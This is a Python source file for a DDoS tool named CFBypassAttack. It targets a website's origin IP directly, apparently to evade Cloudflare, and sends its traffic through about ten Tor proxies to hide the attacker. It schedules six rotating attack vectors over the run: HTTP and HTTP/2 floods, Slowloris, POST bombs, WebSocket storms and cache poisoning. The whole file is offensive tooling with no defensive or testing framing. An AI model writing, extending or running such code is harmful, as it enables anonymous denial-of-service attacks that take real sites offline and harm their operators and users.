import asyncio, logging, json, os, time
from typing import Optional, List, Dict
from dataclasses import dataclass, field

from core.attack.engines.sustained_engine import SustainedAttackEngine, VectorConfig, AttackVector

logger = logging.getLogger("cf_bypass_attack")

@dataclass
class CFBypassAttackResult:
    target: str
    origin_ip: str
    duration: int
    vectors_executed: int
    total_requests: int
    failed_requests: int
    tor_instances: int
    success: bool

class CFBypassAttack:
    def __init__(
        self,
        target_domain: str,
        origin_ip: str,
        target_port: int = 443,
        use_https: bool = True,
        tor_instances: int = 10,
        tor_socks_base: int = 9250,
    ):
        self.target_domain = target_domain
        self.origin_ip = origin_ip
        self.target_port = target_port
        self.use_https = use_https
        self.tor_proxies = self._build_tor_proxies(tor_instances, tor_socks_base)
        self.tor_instances = tor_instances
        self.engine = None
    
    @staticmethod
    def _build_tor_proxies(count: int, base_port: int) -> List[str]:
        return [f"socks5://127.0.0.1:{base_port + i*2}" for i in range(count)]
    
    def _build_vector_schedule(self, duration: int) -> List[VectorConfig]:
        """Build 6-vector rotation for the full duration."""
        per_vector = duration // 6
        return [
            VectorConfig(AttackVector.HTTP_FLOOD, per_vector, "HTTP flood", 100, 50*1024, 30),
            VectorConfig(AttackVector.HTTP2_FLOOD, per_vector, "HTTP/2 flood", 50, 10*1024, 50),
            VectorConfig(AttackVector.SLOWLORIS, per_vector, "Slowloris hold", 500, 1024, 100),
            VectorConfig(AttackVector.POST_BOMB, per_vector, "POST bomb", 10, 1024*1024, 10),
            VectorConfig(AttackVector.WEBSOCKET_STORM, per_vector, "WebSocket storm", 200, 1024, 50),
            VectorConfig(AttackVector.CACHE_POISON, per_vector, "Cache poison", 100, 10*1024, 30),
        ]
    
    async def start(self, duration: int = 600) -> CFBypassAttackResult:
        logger.info(f"CF Bypass Attack: {self.target_domain} -> {self.origin_ip}:{self.target_port}")
        logger.info(f"Tor instances: {self.tor_instances} ({len(self.tor_proxies)} proxies)")
        
        schedule = self._build_vector_schedule(duration)
        engine = SustainedAttackEngine(
            target_ip=self.origin_ip,
            target_domain=self.target_domain,
            target_port=self.target_port,
            use_https=self.use_https,
            vector_schedule=schedule,
            proxies=self.tor_proxies,
        )
        self.engine = engine
        
        try:
            await engine.start()
        except Exception as e:
            logger.error(f"Attack error: {e}")
        
        return CFBypassAttackResult(
            target=self.target_domain,
            origin_ip=self.origin_ip,
            duration=duration,
            vectors_executed=engine.stats.get("vectors_executed", 0),
            total_requests=engine.stats.get("total_requests", 0),
            failed_requests=engine.stats.get("failed_requests", 0),
            tor_instances=self.tor_instances,
            success=engine.stats.get("total_requests", 0) > 0,
        )
    
    def stop(self):
        if self.engine:
            self.engine.stop()
